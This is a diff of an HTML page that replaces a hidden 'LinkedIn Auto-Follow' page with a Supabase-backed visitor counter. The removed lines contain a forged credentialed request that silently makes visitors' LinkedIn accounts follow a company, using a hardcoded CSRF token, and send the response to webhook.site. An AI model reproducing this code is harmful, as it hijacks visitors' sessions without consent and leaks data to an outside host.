@@ -1,36 +1,145 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>LinkedIn Auto-Follow</title>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Visitor Counter (Backend-less)</title>
+  <style>
+    :root { --bg:#fff; --fg:#111; --muted:#666; --card:#f7f7f7; --br:14px; }
+    body { margin: 0; font-family: system-ui, -apple-system, Segoe UI, Roboto, Arial, sans-serif; background: var(--bg); color: var(--fg); }
+    .wrap { max-width: 760px; margin: 40px auto; padding: 0 16px; }
+    .card { background: var(--card); border-radius: var(--br); padding: 20px; box-shadow: 0 1px 2px rgba(0,0,0,.05); }
+    h1 { margin: 0 0 8px; font-size: 1.6rem; }
+    p.muted { color: var(--muted); margin: 6px 0 0; }
+    .grid { display: grid; gap: 12px; margin-top: 16px; grid-template-columns: repeat(auto-fit, minmax(180px,1fr)); }
+    .stat { background: #fff; border-radius: 12px; padding: 14px; text-align: center; border: 1px solid #eee; }
+    .stat b { display:block; font-size: 1.8rem; margin-top: 4px; }
+    .foot { margin-top: 14px; font-size: .9rem; color: var(--muted); }
+    code { background:#eee; padding:2px 6px; border-radius:6px; }
+  </style>
 </head>
 <body>
-    <iframe src="linkedin://voyager/api/feed/dash/followingStates/urn:li:fsd_followingState:urn:li:fsd_company:9372578" style="display: none;"></iframe>
+  <div class="wrap">
+    <div class="card">
+      <h1>Visitor Counter</h1>
+      <p class="muted">Counts unique visitors and total hits with a device breakdown—no backend server.</p>
+
+      <div class="grid">
+        <div class="stat">Total visitors<b id="totalVisitors">—</b></div>
+        <div class="stat">Total hits<b id="totalHits">—</b></div>
+        <div class="stat">Desktop<b id="desktopCount">—</b></div>
+        <div class="stat">Mobile<b id="mobileCount">—</b></div>
+        <div class="stat">Tablet<b id="tabletCount">—</b></div>
+      </div>
+
+      <div class="foot" id="you"></div>
+    </div>
+  </div>
+
+  <!-- Supabase client -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2.45.4/dist/umd/supabase.min.js" integrity="sha384-+7WvA9M/2mT5RrJ8Vn7C9kImJpBBHq7G3m3c7aV7yL0J6E7wVnqQx0HhHcQmM3lA" crossorigin="anonymous"></script>
+
   <script>
-    fetch("linkedin://voyager/api/feed/dash/followingStates/urn:li:fsd_followingState:urn:li:fsd_company:9372578", {
-      method: "POST",
-      credentials: "include",
-      headers: {
-        "Content-Type": "application/json",
-        "csrf-token": "ajax:3722267305665739862"
-      },
-      body: JSON.stringify({
-        patch: {
-          $set: {
-            following: true
-          }
+    // --- CONFIG: fill these from your Supabase project ---
+    const SUPABASE_URL = "https://psqmcpobpqnxgzgmtzhr.supabase.co"; // e.g., https://abcd.supabase.co
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBzcW1jcG9icHFueGd6Z210emhyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc0MDA4OTYsImV4cCI6MjA3Mjk3Njg5Nn0.g4QIn7pm5ZXZAfcCrSjvpBoMBifTjQKH7re_PccNqhE";
+
+    const sb = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    // --- Utils ---
+    function getOrCreateVisitorId() {
+      const key = "visitorId";
+      let id = localStorage.getItem(key);
+      if (!id) {
+        id = ([1e7]+-1e3+-4e3+-8e3+-1e11).replace(/[018]/g, c =>
+          (c ^ crypto.getRandomValues(new Uint8Array(1))[0] & 15 >> c / 4).toString(16)
+        );
+        localStorage.setItem(key, id);
+      }
+      return id;
+    }
+
+    function detectDeviceType() {
+      const uaData = navigator.userAgentData;
+      if (uaData && typeof uaData.mobile === "boolean") {
+        // treat "mobile=false" as desktop; we’ll refine tablet via model hint
+        return uaData.mobile ? "mobile" : "desktop";
+      }
+      const ua = navigator.userAgent || "";
+      const isTablet = /iPad|Tablet|Nexus 7|Nexus 9|SM-T|Tab|Kindle/i.test(ua);
+      const isMobile = /Mobile|iPhone|Android(?!.*Tablet)|IEMobile|Opera Mini/i.test(ua);
+      if (isTablet) return "tablet";
+      if (isMobile) return "mobile";
+      return "desktop";
+    }
+
+    async function refineTablet(deviceType) {
+      try {
+        if (navigator.userAgentData?.getHighEntropyValues) {
+          const info = await navigator.userAgentData.getHighEntropyValues(["model"]);
+          if (/iPad|SM-T|Tab|Tablet/i.test(info.model || "")) return "tablet";
         }
-      })
-    })
-    .then(response => {
-      return response.text().then(text => {
-        console.log("Response status:", response.status);
-        console.log("Response body:", text);
-        fetch("https://webhook.site/your-id?status=" + response.status + "&body=" + encodeURIComponent(text));
-      });
-    })
-    .catch(error => {
-      console.error("Error:", error);
-      fetch("https://webhook.site/46ee6e83-3b97-4bd3-873d-861e50f9eee7?error=" + encodeURIComponent(error.message));
+      } catch {}
+      return deviceType;
+    }
+
+    // --- Main flow ---
+    (async () => {
+      const visitorId = getOrCreateVisitorId();
+      let deviceType = detectDeviceType();
+      deviceType = await refineTablet(deviceType);
+
+      // Upsert visitor (unique)
+      const { error: upsertErr } = await sb
+        .from("visitors")
+        .upsert({ visitor_id: visitorId, device_type: deviceType }, { onConflict: "visitor_id", ignoreDuplicates: true });
+
+      if (upsertErr) console.warn("Visitor upsert error:", upsertErr);
+
+      // Insert a hit (every page view)
+      const { error: hitErr } = await sb
+        .from("hits")
+        .insert({ device_type: deviceType });
+
+      if (hitErr) console.warn("Hit insert error:", hitErr);
+
+      // Query totals
+      const [{ data: vCount, error: vErr }, { data: hCount, error: hErr }] = await Promise.all([
+        sb.from("visitors").select("*", { count: "exact", head: true }),
+        sb.from("hits").select("*", { count: "exact", head: true })
+      ]);
+
+      if (vErr || hErr) console.error(vErr || hErr);
+
+      // Query device breakdown from unique visitors
+      const { data: byDev, error: devErr } = await sb
+        .from("visitors")
+        .select("device_type")
+        .then(async (res) => {
+          if (res.error) throw res.error;
+          // We fetched rows; aggregate client-side to keep SQL simple for beginners
+          const rows = res.data || [];
+          const agg = { desktop: 0, mobile: 0, tablet: 0 };
+          for (const r of rows) {
+            if (agg[r.device_type] !== undefined) agg[r.device_type]++;
+          }
+          return { data: agg, error: null };
+        })
+        .catch(error => ({ data: null, error }));
+
+      // Render
+      document.getElementById("totalVisitors").textContent = vCount ?? "—";
+      document.getElementById("totalHits").textContent = hCount ?? "—";
+      const agg = byDev || { desktop: 0, mobile: 0, tablet: 0 };
+      document.getElementById("desktopCount").textContent = agg.desktop ?? 0;
+      document.getElementById("mobileCount").textContent = agg.mobile ?? 0;
+      document.getElementById("tabletCount").textContent = agg.tablet ?? 0;
+
+      document.getElementById("you").textContent =
+        `You are ${visitorId.slice(0,8)}… on ${deviceType}.`;
+    })().catch(err => {
+      console.error(err);
+      document.getElementById("you").textContent = "Failed to load stats. Check your Supabase URL/key.";
     });
   </script>
 </body>
